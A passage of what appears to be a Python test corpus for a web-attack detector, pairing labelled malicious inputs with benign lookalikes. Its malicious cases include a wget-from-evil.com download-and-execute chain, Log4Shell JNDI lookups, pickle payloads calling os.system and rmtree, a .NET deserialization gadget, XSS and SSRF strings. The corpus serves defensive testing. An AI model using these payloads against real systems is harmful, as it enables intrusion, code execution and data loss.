        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_bot_probed_install_php",
        "cms_probing",
        "Intrusion alert: a bot probed /wp-admin/install.php from 203.0.113.9.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_waf_blocked_setup_config",
        "cms_probing",
        "Our WAF blocked a request targeting /wp-admin/setup-config.php just now.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_exploit_xmlrpc",
        "cms_probing",
        "Someone attempted to exploit /xmlrpc.php on the checkout server overnight.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_attacker_payload_wp_login",
        "cms_probing",
        "The attacker's payload tried to reach /wp-login.php with brute-force "
        "credentials.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_malicious_probe_phpinfo",
        "cms_probing",
        "Security team confirmed a malicious probe against /phpinfo.php last night.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_exploitation_attempts_install_php",
        "cms_probing",
        "Logs show repeated exploitation attempts on /wp-admin/install.php this "
        "morning.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_botnet_scanning_setup_config",
        "cms_probing",
        "A known botnet is scanning for /wp-admin/setup-config.php across our fleet.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "sensitive_file_embedded_prose_attacker_git_config",
        "sensitive_file",
        "We detected an attacker trying to access /.git/config on the public endpoint.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "sensitive_file_embedded_prose_threat_feed_var_www_env",
        "sensitive_file",
        "Threat feed flagged traffic hitting /var/www/.env from a Tor exit node.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "dir_traversal_embedded_prose_honeypot_etc_passwd",
        "dir_traversal",
        "The honeypot recorded a request to /etc/passwd from an unknown scanner.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_scanner_hit_htpasswd",
        "cms_probing",
        "Vulnerability scanner attempted a hit on /.htpasswd during the pentest.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_blocked_probe_install_php",
        "cms_probing",
        "Blocked malicious traffic: a probe against /wp-admin/install.php was denied.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_repeated_attacks_xmlrpc",
        "cms_probing",
        "Suspicious activity: repeated attacks on /xmlrpc.php from a botnet.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_pentest_exploitation_setup_config",
        "cms_probing",
        "The pentest log shows exploitation of /wp-admin/setup-config.php succeeded.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_intrusion_detection_phpinfo",
        "cms_probing",
        "Intrusion detection triggered on a request for /phpinfo.php from a scanner.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_credential_stuffing_wp_login",
        "cms_probing",
        "A malicious actor tried /wp-login.php with a credential-stuffing list.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "sensitive_file_embedded_prose_bad_actor_dotenv",
        "sensitive_file",
        "We caught a bad actor probing /.env on the load balancer.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_attacker_pivot_install_php",
        "cms_probing",
        "The attacker pivoted and hit /wp-admin/install.php right after recon.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_soc_exploit_setup_config",
        "cms_probing",
        "SOC confirmed the exploit attempt against /wp-admin/setup-config.php.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_attack_tooling_xmlrpc",
        "cms_probing",
        "Automated attack tooling scanned for /xmlrpc.php on every subdomain.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "sensitive_file_embedded_prose_scanner_git_config",
        "sensitive_file",
        "The scanner also hit /.git/config while enumerating the site.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_hostile_probe_install_php",
        "cms_probing",
        "We saw a hostile probe against /wp-admin/install.php at 3am.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_malicious_crawler_phpinfo_wp_login",
        "cms_probing",
        "Malicious crawler attempted /phpinfo.php then moved to /wp-login.php.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "sensitive_file_embedded_prose_intrusion_var_www_env",
        "sensitive_file",
        "The intrusion attempt against /var/www/.env was blocked by the WAF.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_exploit_kit_setup_config",
        "cms_probing",
        "An exploit kit tried to reach /wp-admin/setup-config.php twice.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_attack_traffic_install_php",
        "cms_probing",
        "Attack traffic hit /wp-admin/install.php from a known bad IP range.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_scanner_htpasswd_credentials",
        "cms_probing",
        "The scanner probed /.htpasswd looking for exposed credentials.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_bruteforce_bot_wp_login",
        "cms_probing",
        "A brute-force bot hit /wp-login.php more than 500 times overnight.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_recon_activity_xmlrpc",
        "cms_probing",
        "Recon activity included a hit on /xmlrpc.php before the real attack.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_spoofed_referer_install_php",
        "cms_probing",
        "The malicious request targeted /wp-admin/install.php via a spoofed referer.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_ids_flagged_setup_config",
        "cms_probing",
        "Our IDS flagged an exploitation attempt against /wp-admin/setup-config.php.",
        "production",
        _EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON,
    ),
    MaliciousCase(
        "cmd_env_abs_path_shell_dash_c", "cmd_injection", "/usr/bin/env bash -c id"
    ),
    MaliciousCase(
        "cmd_separator_env_abs_path_shell",
        "cmd_injection",
        "; /usr/bin/env sh -c id",
    ),
    MaliciousCase(
        "cms_probing_wp_content_themes_default",
        "cms_probing",
        "/wp-content/themes/default",
    ),
    MaliciousCase("recon_nested_inicio_html", "recon", "/en/inicio.html"),
    MaliciousCase("ldap_null_byte_single_paren_attr_uid", "ldap", "uid=*)%00"),
    MaliciousCase("ldap_null_byte_single_paren_filter_uid", "ldap", "(uid=*)%00"),
    MaliciousCase("ldap_null_byte_single_paren_attr_mail", "ldap", "mail=*)%00"),
    MaliciousCase(
        "ldap_null_byte_single_paren_attr_objectclass",
        "ldap",
        "objectClass=*)%00",
    ),
    MaliciousCase(
        "cmd_glued_backtick_past_rejected_leftmost_match",
        "cmd_injection",
        "`id` search`whoami`",
    ),
    MaliciousCase(
        "cmd_defect5_sql_keyword_after_glued_shell_command",
        "cmd_injection",
        "search`whoami` LIMIT 10",
    ),
    MaliciousCase(
        "cmd_defect5_sql_keyword_before_glued_shell_command",
        "cmd_injection",
        "SELECT note; search`whoami`",
    ),
    MaliciousCase(
        "cmd_defect5_prefix_command_word_glued_shell_command",
        "cmd_injection",
        "curl`whoami` data on file",
    ),
    MaliciousCase(
        "cmd_defect5_sql_keyword_within_exemption_window",
        "cmd_injection",
        "SELECT " + ("z" * 26) + " search`whoami`",
    ),
    MaliciousCase(
        "cmd_defect5_bare_chained_download_and_execute_in_prose",
        "cmd_injection",
        "set your profile bio to: `wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`",
    ),
    MaliciousCase("cmd_dollar_paren_bare_whoami", "cmd_injection", "$(whoami)"),
    MaliciousCase(
        "cmd_dollar_paren_bare_cat_passwd", "cmd_injection", "$(cat /etc/passwd)"
    ),
    MaliciousCase(
        "cmd_dollar_paren_glued_prefix_curl_evil_com",
        "cmd_injection",
        "x$(curl evil.com)",
    ),
    MaliciousCase(
        "cmd_dollar_paren_glued_wrapped_whoami",
        "cmd_injection",
        "foo$(whoami)bar",
    ),
    MaliciousCase("cmd_dollar_brace_bare_ifs", "cmd_injection", "${IFS}"),
    MaliciousCase(
        "cmd_log4shell_direct_jndi_ldap",
        "cmd_injection",
        "${jndi:ldap://evil.example/a}",
    ),
    MaliciousCase(
        "cmd_log4shell_direct_jndi_rmi",
        "cmd_injection",
        "${jndi:rmi://evil.example/a}",
    ),
    MaliciousCase(
        "cmd_log4shell_direct_jndi_dns",
        "cmd_injection",
        "${jndi:dns://evil.example/a}",
    ),
    MaliciousCase(
        "cmd_log4shell_obfuscated_lower_bare", "cmd_injection", "${lower:j}ndi"
    ),
    MaliciousCase(
        "cmd_log4shell_obfuscated_default_value_bare",
        "cmd_injection",
        "${::-j}ndi",
    ),
    MaliciousCase(
        "cmd_log4shell_obfuscated_nested_full_exploit",
        "cmd_injection",
        "${${lower:j}ndi:ldap://evil.example/a}",
    ),
    MaliciousCase("cmd_denylist_glued_nmap", "cmd_injection", "x`nmap`"),
    MaliciousCase("cmd_denylist_glued_powershell", "cmd_injection", "x`powershell`"),
    MaliciousCase("xss_ontoggle_details", "xss", "<details ontoggle=alert(1)>"),
    MaliciousCase("xss_onpointerdown_div", "xss", "<div onpointerdown=alert(1)>"),
    MaliciousCase("xss_onanimationstart_svg", "xss", "<svg onanimationstart=alert(1)>"),
    MaliciousCase("xss_onmousedown_body", "xss", "<body onmousedown=alert(1)>"),
    MaliciousCase("xss_onwheel_div", "xss", "<div onwheel=alert(1)>"),
    MaliciousCase(
        "ssrf_userinfo_prefixed_named_host_localhost",
        "ssrf",
        "http://x@localhost/",
    ),
    MaliciousCase(
        "ssrf_userinfo_prefixed_named_host_gcp_metadata",
        "ssrf",
        "http://attacker@metadata.google.internal/",
    ),
    MaliciousCase("xss_svg_onload_slash_sep", "xss", "<svg/onload=alert(1)>"),
    MaliciousCase("xss_img_onerror_slash_sep", "xss", "<img/onerror=alert(1)>"),
    MaliciousCase("xss_svg_onbegin_slash_sep", "xss", "<svg/onbegin=alert(1)>"),
    MaliciousCase(
        "xss_details_ontoggle_slash_sep", "xss", "<details/ontoggle=alert(1)>"
    ),
    MaliciousCase("template_ssti_curly_brace_arith_int", "template", "{{7*7}}"),
    MaliciousCase(
        "template_ssti_curly_brace_arith_quoted_right", "template", "{{7*'7'}}"
    ),
    MaliciousCase(
        "template_ssti_curly_brace_arith_quoted_left", "template", "{{'7'*7}}"
    ),
    MaliciousCase(
        "template_ssti_curly_brace_arith_double_quoted",
        "template",
        '{{"5"+"5"}}',
    ),
    MaliciousCase("template_ssti_curly_brace_call", "template", "{{config.items()}}"),
    MaliciousCase("template_ssti_hash_brace_arith", "template", "#{7*7}"),
    MaliciousCase(
        "template_ssti_hash_brace_java_runtime_exec",
        "template",
        "#{T(java.lang.Runtime).exec('id')}",
    ),
    MaliciousCase("ssrf_double_at_parser_confusion", "ssrf", "http://a@b@evil.com"),
    MaliciousCase(
        "ssrf_double_at_metadata_ip_masked",
        "ssrf",
        "http://169.254.169.254@trusted@evil.com",
    ),
    MaliciousCase(
        "sensitive_file_trailing_tilde_wp_config",
        "sensitive_file",
        "/wp-config.php~",
    ),
    MaliciousCase(
        "sensitive_file_trailing_tilde_bare_config",
        "sensitive_file",
        "config.php~",
    ),
    MaliciousCase("sensitive_file_trailing_tilde_env", "sensitive_file", "/.env~"),
    MaliciousCase(
        "deserialization_java_serialized_object_b64",
        "deserialization",
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkA"
        "CXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAADZm9veA==",
    ),
    MaliciousCase(
        "deserialization_dotnet_binaryformatter_b64",
        "deserialization",
        "AAEAAAD/////AQAAAAAAAABTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92"
        "aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1"
        "cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQ==",
    ),
    MaliciousCase(
        "deserialization_python_pickle_proto4_b64",
        "deserialization",
        "gASVIwAAAAAAAAB9lCiMBHVzZXKUjAVhbGljZZSMBHJvbGWUjAVhZG1pbpR1Lg==",
    ),
    MaliciousCase(
        "deserialization_ruby_marshal_gem_requirement_b64",
        "deserialization",
        "BAhvOhVHZW06OlJlcXVpcmVtZW50BjoSQHJlcXVpcmVtZW50c1sG",
    ),
    MaliciousCase(
        "deserialization_php_object_injection_stdclass",
        "deserialization",
        'O:8:"stdClass":1:{s:4:"prop";s:9:"pwnedval1";}',
    ),
    MaliciousCase(
        "deserialization_pickle_global_opcode_os_system",
        "deserialization",
        "cos\nsystem\n(S'id'\ntR.",
    ),
    MaliciousCase(
        "deserialization_pickle_global_opcode_arbitrary_module",
        "deserialization",
        "cshutil\nrmtree\n(S'/tmp/x'\ntR.",
    ),
    MaliciousCase(
        "deserialization_ruby_marshal_array_top_level_b64",
        "deserialization",
        "BAhbBmkGaQc=",
    ),
    MaliciousCase(
        "deserialization_ruby_marshal_hash_top_level_b64",
        "deserialization",
        "BAh7BkkiCGNtZAY6BkVUSSIGaWQGOwBU",
    ),
    MaliciousCase(
        "deserialization_php_serializable_object_injection",
        "deserialization",
        'C:11:"ArrayObject":32:{x:i:0;a:0:{};m:a:0:{};}',
    ),
    MaliciousCase(
        "deserialization_php_enum_serialization",
        "deserialization",
        'E:11:"Suit:Hearts";',
    ),
    MaliciousCase(
        "deserialization_dotnet_objectdataprovider_xaml_gadget",
        "deserialization",
        '<ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/'
        'winfx/2006/xaml/presentation"><ObjectDataProvider.MethodParameters>'
        '<System:String xmlns:System="clr-namespace:System;assembly=mscorlib">'
        "cmd /c calc</System:String></ObjectDataProvider.MethodParameters>"
        "</ObjectDataProvider>",
    ),
]

BENIGN_CORPUS: list[BenignCase] = [
    BenignCase(
        "xss_docs_script_tag_mention",
        "The `<script>` tag loads external JavaScript resources.",
    ),
    BenignCase(
        "xss_docs_event_handler_mention",
        "Set `onload` and `onerror` handlers carefully to avoid leaking cookies.",
    ),
    BenignCase(
        "xss_docs_javascript_mention",
        "Our onboarding docs mention JavaScript best practices for legacy browsers.",
    ),
    BenignCase(
        "xss_json_event_handler_keys", '{"onclick": "handleClick", "onload": "init"}'
    ),
    BenignCase(
        "xss_docs_style_attribute_mention",
        'Use `style="color:red"` for basic inline styling.',
    ),
    BenignCase(
        "xss_docs_embed_object_mention",
        "`<embed>` and `<object>` tags are deprecated in favor of standard "
        "media elements.",
    ),
    BenignCase(
        "xss_prose_script_kiddie_joke",
        "I love using <3 emoji and script kiddie jokes in my bio.",
    ),
    BenignCase(
        "xss_docs_onerror_callback_explainer",
        "The onError callback receives the exception object as its only argument.",
    ),
    BenignCase(
        "sqli_prose_select_few_items",
        "I'll select a few items from the catalog for you",
    ),
    BenignCase(
        "sqli_prose_select_candidates",
        "we will select candidates from the applicant pool",
    ),
    BenignCase(
        "sqli_prose_order_by_no_digit", "please order by phone or email when you can"
    ),
    BenignCase(
        "sqli_prose_drop_by_office",
        "We dropped the old table last quarter when we migrated to the new schema.",
    ),
    BenignCase(
        "sqli_json_query_select_from", '{"query": "SELECT id FROM cache", "ttl": 60}'
    ),
    BenignCase(
        "sqli_prose_where_equals_no_space",
        "Please specify where=kitchen for the delivery instructions.",
    ),
    BenignCase(
        "sqli_prose_select_join_no_from",
        "In the interview, she asked about SELECT and JOIN clauses in SQL.",
    ),
    BenignCase(
        "sqli_prose_1_equals_1_bug_report",
        "The bug was triggered by 1=1 always evaluating true in the validator.",
    ),
    BenignCase(
        "sqli_markdown_backtick_select",
        "Run `SELECT id FROM users` in the console to verify the migration.",
    ),
    BenignCase(
        "sqli_changelog_mysql_upgrade",
        "Upgraded MySQL and re-ran `ANALYZE TABLE` on the largest tables.",
    ),
    BenignCase("dir_traversal_filename_with_single_dotdot", "reports/../summary.csv"),
    BenignCase(
        "dir_traversal_prose_parent_directory",
        "Move the archive up one directory using the parent folder shortcut.",
    ),
    BenignCase(
        "dir_traversal_windows_path_no_dotdot",
        "C:\\Users\\alice\\Documents\\report.docx",
    ),
    BenignCase("dir_traversal_relative_path_no_dotdot", "./assets/images/logo.png"),
    BenignCase(
        "dir_traversal_etc_passwd_prose_mention",
        "The `/etc/passwd` file lists local user accounts on Unix systems.",
    ),
    BenignCase("dir_traversal_single_dotdot_no_repeat", "../shared/notes.txt"),
    BenignCase(
        "dir_traversal_single_dotdot_archive_path", "backup/../archive/2024.tar.gz"
    ),
    BenignCase(
        "dir_traversal_prose_two_dots_explainer",
        "Parent directories are referenced with two dots in Unix shells.",
    ),
    BenignCase("path_traversal_url_with_percent_20", "search?q=hello%20world"),
    BenignCase("path_traversal_url_encoded_slash_only", "path%2Fto%2Ffile"),
    BenignCase(
        "path_traversal_prose_percent_encoding",
        "The percent-encoding for a space character is %20 in URLs.",
    ),
    BenignCase("path_traversal_percent_25_off", "search?tag=100%25off"),
    BenignCase(
        "path_traversal_prose_percent20_percent2f",
        "URL-encoded spaces use %20 while encoded slashes use %2F.",
    ),
    BenignCase(
        "cmd_injection_markdown_ls_mention", "Run `ls` to list files in the directory."
    ),
    BenignCase(
        "cmd_injection_markdown_curl_snippet",
        "Try `curl -X GET` against the users endpoint.",
    ),
    BenignCase(
        "cmd_injection_sql_backtick_identifier",
        "SELECT `id`, `name` FROM `users` WHERE `active` = 1",
    ),
    BenignCase(
        "cmd_injection_js_template_literal_url",
        "const url = `https://api.example.com/users/${userId}`;",
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_sentence", "first do this; then enjoy your day"
    ),
    BenignCase(
        "cmd_injection_backtick_wrapped_dollar_paren", "see the `$(id)` example"
    ),
    BenignCase("cmd_injection_shell_docs_var_expansion", "export PATH=${HOME}/bin"),
    BenignCase(
        "cmd_injection_shell_path_mention_without_flag",
        "The path /bin/sh is the default shell on many systems.",
    ),
    BenignCase(
        "cmd_injection_env_command_mention_without_shell",
        "Check your `env` for the missing `PATH` entry.",
    ),
    BenignCase(
        "cmd_injection_changelog_reboot_mention",
        "The `reboot` command now requires confirmation.",
    ),
    BenignCase(
        "cmd_injection_prose_double_ampersand_operator",
        "&& is the logical AND operator in most C-like languages.",
    ),
    BenignCase(
        "cmd_injection_commit_message_docker_bump",
        "chore: bump `docker` base image to 3.12-slim",
    ),
    BenignCase(
        "cmd_injection_sql_dotted_qualified_identifier",
        "SELECT `u`.`id` FROM `users` `u` JOIN `orders` `o` ON `u`.`id` = `o`.`uid`",
    ),
    BenignCase(
        "cmd_injection_json_wrapped_backtick_value",
        '{"tip": "use `curl` to fetch the resource", "example": "`wget` the release '
        'archive"}',
    ),
    BenignCase("file_inclusion_ordinary_https_url", "https://example.com/path?a=1"),
    BenignCase("file_inclusion_ordinary_http_url", "http://example.com"),
    BenignCase(
        "file_inclusion_json_webhook_url",
        '{"callback_url": "https://api.customer.com/webhook"}',
    ),
    BenignCase(
        "file_inclusion_prose_docs_link",
        "see https://github.com/rennf93/guard-core for the source",
    ),
    BenignCase(
        "file_inclusion_query_string_encoded",
        "https://example.com/callback?redirect=%2Fhome",
    ),
    BenignCase("file_inclusion_ipv6_literal_url", "https://[2001:db8::1]/path"),
    BenignCase("file_inclusion_ftp_url", "ftp://ftp.example.com/pub/file.txt"),
    BenignCase(
        "file_inclusion_redirect_uri_callback",
        "redirect_uri=https://myapp.com/callback",
    ),
    BenignCase("file_inclusion_next_dashboard", "next=https://example.com/dashboard"),
    BenignCase("file_inclusion_url_cdn_asset", "url=https://cdn.example.com/asset.js"),
    BenignCase("file_inclusion_return_home", "return=https://example.com/home"),
    BenignCase(
        "file_inclusion_returnto_profile",
        "returnTo=https://app.example.com/profile",
    ),
    BenignCase(
        "file_inclusion_continue_checkout",
        "continue=https://shop.example.com/checkout",
    ),
    BenignCase(
        "file_inclusion_callback_oauth",
        "callback=https://auth.example.com/oauth/complete",
    ),
    BenignCase(
        "file_inclusion_benign_readme_txt_link",
        "download=https://raw.githubusercontent.com/user/repo/main/README.txt",
        "production",
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    ),
    BenignCase(
        "file_inclusion_benign_docs_readme_txt_link",
        "return=https://example.com/docs/readme.txt",
        "production",
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    ),
    BenignCase(
        "file_inclusion_benign_terms_txt_link",
        "file=https://example.com/legal/terms.txt",
        "production",
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    ),
    BenignCase(
        "file_inclusion_benign_installer_sh_link",
        "url=https://example.com/install.sh",
        "production",
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    ),
    BenignCase(
        "file_inclusion_benign_docker_installer_sh_link",
        "url=https://get.docker.com/install.sh",
        "production",
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    ),
    BenignCase(
        "file_inclusion_benign_cgi_search_link",
        "url=https://legacy.example.com/cgi-bin/search.cgi",
        "production",
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    ),
    BenignCase(
        "ldap_prose_wildcard_search_mention",
        "Use an asterisk wildcard in your search query to match partial names.",
    ),
    BenignCase(
        "ldap_prose_and_or_boolean_logic",
        "The filter combines AND and OR boolean logic for the report.",
    ),
    BenignCase(
        "ldap_markdown_equals_example",
        "Set `role = admin` in the config to grant elevated access.",
    ),
    BenignCase(
        "ldap_prose_directory_lookup",
        "The directory lookup returned all users in the marketing group.",
    ),
    BenignCase(
        "ldap_prose_bind_service_account",
        "The LDAP bind used a service account with read-only scope.",
    ),
    BenignCase(
        "ldap_prose_filter_syntax_explainer",
        "Filter syntax in LDAP uses parentheses to group conditions.",
    ),
    BenignCase("ldap_lookalike_maths_expression", "total = a*)(b+c)"),
    BenignCase(
        "ldap_lookalike_footnote_reference",
        "See appendix A*)(footnote 3) for details",
    ),
    BenignCase(
        "ldap_ops_log_chained_filter_objectclass_department",
        "Our nightly sync uses filter: (objectClass=*)(department=Sales) and it "
        "worked fine.",
    ),
    BenignCase(
        "ldap_ops_log_chained_filter_uid_status",
        "search_filter: (uid=*)(status=active)",
    ),
    BenignCase(
        "xml_ordinary_declaration_no_entity",
        '<?xml version="1.0" encoding="UTF-8"?><note><body>Hello</body></note>',
    ),
    BenignCase(
        "xml_prose_cdata_explainer",
        "A CDATA section lets you embed raw text without escaping special characters.",
    ),
    BenignCase(
        "xml_prose_entity_explainer",
        "An XML entity like `&amp;` represents a reserved character.",
    ),
    BenignCase(
        "xml_config_snippet_no_doctype",
        "<settings><timeout>30</timeout><retries>3</retries></settings>",
    ),
    BenignCase(
        "xml_prose_soap_envelope",
        "The SOAP envelope wraps the XML body in a standard namespace.",
    ),
    BenignCase("ssrf_known_good_benign_stripe", "https://api.stripe.com/v1/charges"),
    BenignCase("ssrf_known_good_benign_github", "https://github.com/anthropics/claude"),
    BenignCase("ssrf_version_like_text", "software 10.4.2 release"),
    BenignCase(
        "ssrf_bare_two_octet_prefix", "192.168 is a common prefix in networking docs"
    ),
    BenignCase("ssrf_public_dns_google", "http://8.8.8.8/"),
    BenignCase("ssrf_localhost_lookalike_domain", "localhost.example.com/callback"),
    BenignCase("ssrf_notlocalhost_domain", "https://notlocalhost.io/status"),
    BenignCase("ssrf_private_ip_lookalike_domain", "https://192-168-1-1.nip.io/"),
    BenignCase(
        "ssrf_aws_apigateway_url",
        "https://apigateway.us-east-1.amazonaws.com/prod/resource",
    ),
    BenignCase(
        "ssrf_slack_webhook_url", "https://hooks.slack.com/services/T000/B000/XXXX"
    ),
    BenignCase("ssrf_scheme_port_redis", "redis://6379"),
    BenignCase("ssrf_scheme_port_grpc", "grpc://50051"),
    BenignCase("ssrf_scheme_port_amqp", "amqp://5672"),
    BenignCase("ssrf_scheme_port_https_path", "https://2023/blog"),
    BenignCase(
        "ssrf_scheme_port_tcp_prose",
        "connect via tcp://8080 for the health probe",
    ),
    BenignCase(
        "rest_path_gcp_computeMetadata_no_default_segment",
        "computeMetadata/v1/instance/hostname",
    ),
    BenignCase(
        "rest_path_aws_creds_prose_mention",
        "Loaded credentials from ~/.aws/credentials",
    ),
    BenignCase(
        "rest_path_s3_key_realistic",
        "s3://my-bucket/uploads/2024/01/15/report-final-v2-reviewed.pdf",
    ),
    BenignCase(
        "rest_path_git_sha_full_hex",
        "a618a05f4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e",
    ),
    BenignCase(
        "rest_path_opaque_session_token_non_jwt",
        "sess_9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a",
    ),
    BenignCase(
        "rest_path_regression10_gcp_computeMetadata_default_segment",
        "computeMetadata/v1/instance/service-accounts/default/token",
    ),
    BenignCase(
        "rest_path_regression10_aws_creds_bare_path",
        "~/.aws/credentials",
    ),
    BenignCase(
        "rest_path_k8s_default_namespace_pods",
        "/api/v1/namespaces/default/pods",
    ),
    BenignCase("nosql_benign_dollar_value_price", '{"price":"$25","name":"coffee"}'),
    BenignCase(
        "nosql_benign_plain_query_object", '{"username": "alice", "role": "admin"}'
    ),
    BenignCase(
        "nosql_prose_mongodb_operator_mention",
        "MongoDB operators like $gt and $lt let you build range queries.",
    ),
    BenignCase(
        "nosql_benign_nested_object_no_operator",
        '{"address": {"city": "Berlin", "zip": "10115"}}',
    ),
    BenignCase(
        "nosql_benign_cart_total_object",
        '{"cart_total": {"currency": "USD", "amount": 42.5}}',
    ),
    BenignCase(
        "nosql_prose_aggregation_pipeline",
        "MongoDB aggregation pipelines chain multiple stage operators together.",
    ),
    BenignCase("nosql_benign_bare_bracket_empty_array", "arr[]=1"),
    BenignCase("nosql_benign_bare_bracket_object_key", "obj[key]=val"),
    BenignCase("nosql_benign_bare_bracket_numeric_index", "order[0]=asc"),
    BenignCase("nosql_benign_bare_bracket_status_key", "filter[status]=active"),
    BenignCase("nosql_benign_bare_bracket_nested_index", "items[2][name]=x"),
    BenignCase("file_upload_benign_png_filename", 'filename="avatar.png"'),
    BenignCase("file_upload_benign_pdf_filename", 'filename="invoice.pdf"'),
    BenignCase("file_upload_benign_docx_filename", "filename='report.docx'"),
    BenignCase(
        "file_upload_prose_upload_limits",
        "Uploaded files are limited to 10 MB and must be JPEG or PNG.",
    ),
    BenignCase("file_upload_benign_pptx_filename", 'filename="presentation.pptx"'),
    BenignCase(
        "file_upload_prose_accepted_formats",
        "Accepted upload formats are PNG, JPG, and PDF only.",
    ),
    BenignCase(
        "template_benign_mustache_interpolation",
        "The template uses `{{ user.name }}` for interpolation.",
    ),
    BenignCase(
        "template_benign_jinja_if_block",
        "Our Jinja template renders `{% if active %}` blocks conditionally.",
    ),
    BenignCase(
        "template_benign_dollar_brace_var",
        "Set the amount with ${amount} in the template.",
    ),
    BenignCase(
        "template_benign_makefile_variable",
        "The Makefile references $(CC) and $(CFLAGS) for the compiler.",
    ),
    BenignCase(
        "template_prose_erb_explainer",
        "ERB templates use `<%= %>` to output Ruby expressions in HTML.",
    ),
    BenignCase(
        "template_prose_handlebars_explainer",
        "Handlebars templates use double curly braces {{ }} for variable "
        "interpolation.",
    ),
    BenignCase(
        "http_split_prose_crlf_explainer",
        "CRLF stands for carriage return and line feed, used to end HTTP header lines.",
    ),
    BenignCase(
        "http_split_benign_multiline_body",
        "Line one of the message.\nLine two of the message.\nLine three.",
    ),
    BenignCase(
        "http_split_prose_location_header_mention",
        "The `Location` header is set by the server to trigger a redirect.",
    ),
    BenignCase(
        "http_split_prose_set_cookie_mention",
        "The response included a `Set-Cookie` header for session tracking.",
    ),
    BenignCase(
        "http_split_prose_redirect_mention",
        "Redirects use the `Location` header with a 302 status code.",
    ),
